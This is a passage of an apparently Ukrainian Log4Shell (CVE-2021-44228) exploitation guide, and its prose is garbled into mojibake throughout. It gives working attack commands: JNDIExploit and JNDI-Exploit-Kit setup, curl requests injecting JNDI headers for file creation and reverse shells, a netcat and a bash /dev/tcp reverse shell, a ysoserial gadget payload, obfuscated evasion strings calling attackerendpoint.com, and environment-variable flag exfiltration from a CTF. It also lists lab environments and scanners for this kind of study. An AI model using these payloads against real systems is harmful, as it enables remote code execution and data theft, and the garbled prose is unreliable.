–î–ª—è —Ü—å–æ–≥–æ –ø—Ä–∏–∫–ª–∞–¥—É –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ —Ü–µ–π **—É—Ä–∞–∑–ª–∏–≤–∏–π –≤–µ–±-—Å–µ—Ä–≤–µ—Ä –¥–ª—è log4shell** –Ω–∞ –ø–æ—Ä—Ç—É 8080: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_—É README –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ, —è–∫ –π–æ–≥–æ –∑–∞–ø—É—Å—Ç–∏—Ç–∏_). –¶—è —É—Ä–∞–∑–ª–∏–≤–∞ –ø—Ä–æ–≥—Ä–∞–º–∞ —Ä–µ—î—Å—Ç—Ä—É—î –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º —É—Ä–∞–∑–ª–∏–≤–æ—ó –≤–µ—Ä—Å—ñ—ó log4shell –≤–º—ñ—Å—Ç –∑–∞–≥–æ–ª–æ–≤–∫–∞ HTTP-–∑–∞–ø–∏—Ç—É _X-Api-Version_.

–ü–æ—Ç—ñ–º –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ jar-—Ñ–∞–π–ª **JNDIExploit** —ñ –≤–∏–∫–æ–Ω–∞—Ç–∏ –π–æ–≥–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
–ü—ñ—Å–ª—è –ø—Ä–æ—á–∏—Ç–∞–Ω–Ω—è –∫–æ–¥—É –≤—Å—å–æ–≥–æ –∫—ñ–ª—å–∫–∞ —Ö–≤–∏–ª–∏–Ω, –≤ _com.feihong.ldap.LdapServer_ —Ç–∞ _com.feihong.ldap.HTTPServer_ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —è–∫ **—Å—Ç–≤–æ—Ä—é—é—Ç—å—Å—è —Å–µ—Ä–≤–µ—Ä–∏ LDAP —Ç–∞ HTTP**. –°–µ—Ä–≤–µ—Ä LDAP –±—É–¥–µ —Ä–æ–∑—É–º—ñ—Ç–∏, —è–∫–∏–π –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –ø–æ—Ç—Ä—ñ–±–Ω–æ –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞—Ç–∏, —ñ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç—å –∂–µ—Ä—Ç–≤—É –Ω–∞ —Å–µ—Ä–≤–µ—Ä HTTP, —è–∫–∏–π –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞—Ç–∏–º–µ –µ–∫—Å–ø–ª–æ–π—Ç.\
–£ _com.feihong.ldap.gadgets_ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **–¥–µ—è–∫—ñ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ –≥–∞–¥–∂–µ—Ç–∏**, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –±–∞–∂–∞–Ω–æ—ó –¥—ñ—ó (–ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥). –ê –≤ _com.feihong.ldap.template_ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Ä—ñ–∑–Ω—ñ –∫–ª–∞—Å–∏ —à–∞–±–ª–æ–Ω—ñ–≤, —è–∫—ñ **–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏–º—É—Ç—å –µ–∫—Å–ø–ª–æ–π—Ç–∏**.

–í–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤—Å—ñ –¥–æ—Å—Ç—É–ø–Ω—ñ –µ–∫—Å–ø–ª–æ–π—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. –î–µ—è–∫—ñ –∫–æ—Ä–∏—Å–Ω—ñ:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
–¢–∞–∫–∏–º —á–∏–Ω–æ–º, —É –Ω–∞—à–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ –º–∏ –≤–∂–µ –º–∞—î–º–æ –∑–∞–ø—É—â–µ–Ω—É —Ü—é –¥–æ–¥–∞—Ç–∫–æ–≤—É –¥–æ–¥–∞—Ç–æ–∫ Docker. –©–æ–± –∑–¥—ñ–π—Å–Ω–∏—Ç–∏ –∞—Ç–∞–∫—É:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
–ü—ñ–¥ —á–∞—Å –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –∞—Ç–∞–∫ –≤–∏ –ø–æ–±–∞—á–∏—Ç–µ –≤–∏–≤—ñ–¥ —É —Ç–µ—Ä–º—ñ–Ω–∞–ª—ñ, –¥–µ –≤–∏ –≤–∏–∫–æ–Ω–∞–ª–∏ **JNDIExploit-1.2-SNAPSHOT.jar**.

**–ü–∞–º'—è—Ç–∞–π—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` –¥–ª—è —ñ–Ω—à–∏—Ö –≤–∞—Ä—ñ–∞–Ω—Ç—ñ–≤ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó. –ö—Ä—ñ–º —Ç–æ–≥–æ, —É —Ä–∞–∑—ñ –ø–æ—Ç—Ä–µ–±–∏ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ –ø–æ—Ä—Ç LDAP —Ç–∞ HTTP —Å–µ—Ä–≤–µ—Ä—ñ–≤.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

–ê–Ω–∞–ª–æ–≥—ñ—á–Ω–æ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –∞—Ç–∞–∫—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit), —â–æ–± –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —Ü—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å.\
–í–∏ –º–æ–∂–µ—Ç–µ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ URL-–∞–¥—Ä–µ—Å–∏ –¥–ª—è –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ –∂–µ—Ä—Ç–≤—ñ, –∑–∞–ø—É—Å—Ç–∏–≤—à–∏:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_–¶–µ–π –∞—Ç–∞–∫–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–æ–≥–æ –æ–±'—î–∫—Ç–∞ Java –ø—Ä–∞—Ü—é–≤–∞—Ç–∏–º–µ –≤ –ª–∞–±–æ—Ä–∞—Ç–æ—Ä—ñ—è—Ö, —Ç–∞–∫–∏—Ö —è–∫ **THM solar room**. –û–¥–Ω–∞–∫ —Ü–µ, —è–∫ –ø—Ä–∞–≤–∏–ª–æ, –Ω–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏–º–µ (–æ—Å–∫—ñ–ª—å–∫–∏ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º Java –Ω–µ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∞ –Ω–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –∫–æ–¥—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é LDAP), —è –≤–≤–∞–∂–∞—é, —â–æ —Ü–µ —Ç–æ–º—É, —â–æ –≤–æ–Ω–∞ –Ω–µ –∑–ª–æ–≤–∂–∏–≤–∞—î –¥–æ–≤—ñ—Ä–µ–Ω–∏–º –∫–ª–∞—Å–æ–º –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–æ–¥—É._

### RCE - JNDI-Injection-Exploit-Plus

[https://github.com/cckuailong/JNDI-Injection-Exploit-Plus](https://github.com/cckuailong/JNDI-Injection-Exploit-Plus) - —â–µ –æ–¥–∏–Ω —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó **–ø—Ä–∞—Ü—é—é—á–∏—Ö JNDI –ø–æ—Å–∏–ª–∞–Ω—å** —Ç–∞ –Ω–∞–¥–∞–Ω–Ω—è —Ñ–æ–Ω–æ–≤–∏—Ö —Å–ª—É–∂–±, –∑–∞–ø—É—Å–∫–∞—é—á–∏ RMI-—Å–µ—Ä–≤–µ—Ä, LDAP-—Å–µ—Ä–≤–µ—Ä —Ç–∞ HTTP-—Å–µ—Ä–≤–µ—Ä.\

### RCE - ysoserial & JNDI-Exploit-Kit

–¶–µ–π –≤–∞—Ä—ñ–∞–Ω—Ç –¥—ñ–π—Å–Ω–æ –∫–æ—Ä–∏—Å–Ω–∏–π –¥–ª—è –∞—Ç–∞–∫ –Ω–∞ **–≤–µ—Ä—Å—ñ—ó Java, –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –Ω–∞ –¥–æ–≤—ñ—Ä—É –ª–∏—à–µ –≤–∫–∞–∑–∞–Ω–∏–º –∫–ª–∞—Å–∞–º, –∞ –Ω–µ –≤—Å—ñ–º**. –¢–æ–º—É **ysoserial** –±—É–¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó **—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ–π –¥–æ–≤—ñ—Ä–µ–Ω–∏—Ö –∫–ª–∞—Å—ñ–≤**, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ —è–∫ –≥–∞–¥–∂–µ—Ç–∏ –¥–ª—è **–≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–æ–¥—É** (_–¥–æ–≤—ñ—Ä–µ–Ω–∏–π –∫–ª–∞—Å, —è–∫–∏–º –∑–ª–æ–≤–∂–∏–≤–∞—î ysoserial, –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –∂–µ—Ä—Ç–≤–æ—é –≤ –ø—Ä–æ–≥—Ä–∞–º—ñ Java, —â–æ–± –µ–∫—Å–ø–ª–æ–π—Ç –ø—Ä–∞—Ü—é–≤–∞–≤_).

–ó–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **ysoserial** –∞–±–æ [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) –≤–∏ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –µ–∫—Å–ø–ª–æ–π—Ç –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó, —è–∫–∏–π –±—É–¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é JNDI:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit), —â–æ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ **JNDI-–ø–æ—Å–∏–ª–∞–Ω–Ω—è**, –¥–µ –µ–∫—Å–ø–ª–æ–π—Ç –±—É–¥–µ —á–µ–∫–∞—Ç–∏ –Ω–∞ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –º–∞—à–∏–Ω. –í–∏ –º–æ–∂–µ—Ç–µ –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞—Ç–∏ **—Ä—ñ–∑–Ω—ñ –µ–∫—Å–ø–ª–æ–π—Ç–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω—ñ** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é JNDI-Exploit-Kit –∞–±–æ –Ω–∞–≤—ñ—Ç—å –≤–∞—à–∏–º–∏ **–≤–ª–∞—Å–Ω–∏–º–∏ —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ–π–Ω–∏–º–∏ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è–º–∏** (—Å—Ç–≤–æ—Ä–µ–Ω–∏–º–∏ –≤–∞–º–∏ –∞–±–æ ysoserial).
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

–¢–µ–ø–µ—Ä –≤–∏ –º–æ–∂–µ—Ç–µ –ª–µ–≥–∫–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è JNDI –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ç–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è **–∑–≤–æ—Ä–æ—Ç–Ω–æ–≥–æ shell** –ø—Ä–æ—Å—Ç–æ –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ –Ω–∞ –≤—Ä–∞–∑–ª–∏–≤—É –≤–µ—Ä—Å—ñ—é log4j: **`${ldap://10.10.14.10:1389/generated}`**

### –£—Ö–∏–ª–µ–Ω–Ω—è
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ƒ±}}:ldap://...} //Notice the unicode "i"
```
### –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω—ñ —Å–∫–∞–Ω–µ—Ä–∏

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - –ó–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è –ª–æ–∫–∞–ª—å–Ω–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –±—ñ–±–ª—ñ–æ—Ç–µ–∫

### –õ–∞–±–æ—Ä–∞—Ç–æ—Ä—ñ—ó –¥–ª—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è

* [**–ú–∞—à–∏–Ω–∞ LogForge HTB**](https://app.hackthebox.com/tracks/UHC-track)
* [**–ö—ñ–º–Ω–∞—Ç–∞ Solar Try Hack Me**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## –ü—ñ—Å–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó Log4Shell

–£ —Ü—å–æ–º—É [**–æ–ø–∏—Å—ñ CTF**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) –¥–æ–±—Ä–µ –ø–æ—è—Å–Ω–µ–Ω–æ, —è–∫ –º–æ–∂–Ω–∞ **–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏** –¥–µ—è–∫–∏–º–∏ —Ñ—É–Ω–∫—Ü—ñ—è–º–∏ **Log4J**.

–ù–∞ [**—Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –±–µ–∑–ø–µ–∫–∏**](https://logging.apache.org/log4j/2.x/security.html) Log4j —î –¥–µ—è–∫—ñ —Ü—ñ–∫–∞–≤—ñ —Ä–µ—á–µ–Ω–Ω—è:

> –ü–æ—á–∏–Ω–∞—é—á–∏ –∑ –≤–µ—Ä—Å—ñ—ó 2.16.0 (–¥–ª—è Java 8), —Ñ—É–Ω–∫—Ü—ñ—è **–ø–æ—à—É–∫—É –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å –±—É–ª–∞ –ø–æ–≤–Ω—ñ—Å—Ç—é –≤–∏–¥–∞–ª–µ–Ω–∞**. **–ü–æ—à—É–∫–∏ –≤ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –≤—Å–µ —â–µ –ø—Ä–∞—Ü—é—é—Ç—å**. –ö—Ä—ñ–º —Ç–æ–≥–æ, Log4j —Ç–µ–ø–µ—Ä –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤–∏–º–∏–∫–∞—î –¥–æ—Å—Ç—É–ø –¥–æ JNDI. –ü–æ—à—É–∫–∏ JNDI –≤ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Ç–µ–ø–µ—Ä –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∫–ª—é—á–∞—Ç–∏ —è–≤–Ω–æ.

> –ü–æ—á–∏–Ω–∞—é—á–∏ –∑ –≤–µ—Ä—Å—ñ—ó 2.17.0 (—ñ 2.12.3 —Ç–∞ 2.3.1 –¥–ª—è Java 7 —Ç–∞ Java 6), **—Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è —Ä—è–¥–∫—ñ–≤ –ø–æ—à—É–∫—É –≤ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è —Ä–µ–∫—É—Ä—Å–∏–≤–Ω–æ –ª–∏—à–µ**; –≤ –±—É–¥—å-—è–∫–æ–º—É —ñ–Ω—à–æ–º—É –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ —Ä–æ–∑–≥–æ—Ä—Ç–∞—î—Ç—å—Å—è –ª–∏—à–µ –≤–µ—Ä—Ö–Ω—ñ–π —Ä—ñ–≤–µ–Ω—å –ø–æ—à—É–∫—É, —ñ –±—É–¥—å-—è–∫—ñ –≤–∫–ª–∞–¥–µ–Ω—ñ –ø–æ—à—É–∫–∏ –Ω–µ —Ä–æ–∑–≥–æ—Ä—Ç–∞—é—Ç—å—Å—è.

–¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∂–æ–¥–Ω—É –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—é `jndi`**. –ö—Ä—ñ–º —Ç–æ–≥–æ, –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è **—Ä–µ–∫—É—Ä—Å–∏–≤–Ω–∏—Ö –ø–æ—à—É–∫—ñ–≤** –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –º–∞—Ç–∏ —ó—Ö –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —É —Ü—å–æ–º—É CTF —Ü–µ –±—É–ª–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–æ –≤ —Ñ–∞–π–ª—ñ log4j2.xml:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### –ü–æ—à—É–∫ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞

–£ [—Ü—å–æ–º—É CTF](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/) –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞–≤ –∑–Ω–∞—á–µ–Ω–Ω—è `${sys:cmd}` —ñ –ø–æ—Ç—Ä–µ–±—É–≤–∞–≤ –≤–∏—Ç—è–≥—Ç–∏ –ø—Ä–∞–ø–æ—Ä–µ—Ü—å –∑ –∑–º—ñ–Ω–Ω–æ—ó —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞.\
–Ø–∫ –±–∞—á–∏–º–æ –Ω–∞ —Ü—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –≤ [**–ø–æ–ø–µ—Ä–µ–¥–Ω—ñ—Ö –≤–∞–Ω—Ç–∞–∂–∞—Ö**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification) —î —Ä—ñ–∑–Ω—ñ —Å–ø–æ—Å–æ–±–∏ –¥–æ—Å—Ç—É–ø—É –¥–æ –∑–º—ñ–Ω–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞, —Ç–∞–∫—ñ —è–∫: **`${env:FLAG}`**. –£ —Ü—å–æ–º—É CTF —Ü–µ –±—É–ª–æ –Ω–µ–∫–æ—Ä–∏—Å–Ω–æ, –∞–ª–µ —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–æ –≤ —ñ–Ω—à–∏—Ö —Ä–µ–∞–ª—å–Ω–∏—Ö —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö.

### –ï–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—è –≤ –≤–∏–Ω—è—Ç–∫–∞—Ö

–£ CTF –≤–∏ **–Ω–µ –º–æ–≥–ª–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ stderr** –¥–æ–¥–∞—Ç–∫–∞ –Ω–∞ Java, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ log4J, –∞–ª–µ –≤–∏–Ω—è—Ç–∫–∏ Log4J **–Ω–∞–¥—Å–∏–ª–∞—é—Ç—å—Å—è –Ω–∞ stdout**, —è–∫–∏–π –±—É–≤ –≤–∏–≤–µ–¥–µ–Ω–∏–π —É –¥–æ–¥–∞—Ç–∫—É Python. –¶–µ –æ–∑–Ω–∞—á–∞–ª–æ, —â–æ, —Å–ø—Ä–æ–≤–æ–∫—É–≤–∞–≤—à–∏ –≤–∏–Ω—è—Ç–æ–∫, –º–∏ –º–æ–≥–ª–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –≤–º—ñ—Å—Ç—É. –í–∏–Ω—è—Ç–æ–∫ –¥–ª—è –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó –ø—Ä–∞–ø–æ—Ä—Ü—è –±—É–≤: **`${java:${env:FLAG}}`.** –¶–µ –ø—Ä–∞—Ü—é—î, –æ—Å–∫—ñ–ª—å–∫–∏ **`${java:CTF{blahblah}}`** –Ω–µ —ñ—Å–Ω—É—î, —ñ –±—É–¥–µ –ø–æ–∫–∞–∑–∞–Ω–∏–π –≤–∏–Ω—è—Ç–æ–∫ –∑—ñ –∑–Ω–∞—á–µ–Ω–Ω—è–º –ø—Ä–∞–ø–æ—Ä—Ü—è:

![](<../../.gitbook/assets/image (157).png>)

### –í–∏–Ω—è—Ç–∫–∏ –≤ —à–∞–±–ª–æ–Ω–∞—Ö –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü—ñ—ó

–ü—Ä–æ—Å—Ç–æ –∑–≥–∞–¥–∞—é—á–∏, –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–≥–ª–∏ –≤–ø—Ä–æ–≤–∞–¥–∏—Ç–∏ –Ω–æ–≤—ñ [**—à–∞–±–ª–æ–Ω–∏ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü—ñ—ó**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) —Ç–∞ —Å–ø—Ä–æ–≤–æ–∫—É–≤–∞—Ç–∏ –≤–∏–Ω—è—Ç–∫–∏, —è–∫—ñ –±—É–¥—É—Ç—å –∑–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω—ñ –≤ `stdout`. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

–¶–µ –Ω–µ –±—É–ª–æ –∫–æ—Ä–∏—Å–Ω–∏–º –¥–ª—è –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó –¥–∞—Ç–∏ –≤ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—ñ –ø—Ä–æ –ø–æ–º–∏–ª–∫—É, –æ—Å–∫—ñ–ª—å–∫–∏ –ø–æ—à—É–∫ –Ω–µ –±—É–≤ –≤–∏—Ä—ñ—à–µ–Ω–∏–π –¥–æ —à–∞–±–ª–æ–Ω—É –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü—ñ—ó, –∞–ª–µ —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–∏–º –¥–ª—è —ñ–Ω—à–∏—Ö —Ä–µ—á–µ–π, —Ç–∞–∫–∏—Ö —è–∫ –≤–∏—è–≤–ª–µ–Ω–Ω—è.

### –®–∞–±–ª–æ–Ω–∏ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü—ñ—ó —Ä–µ–≥—É–ª—è—Ä–Ω–∏—Ö –≤–∏—Ä–∞–∑—ñ–≤

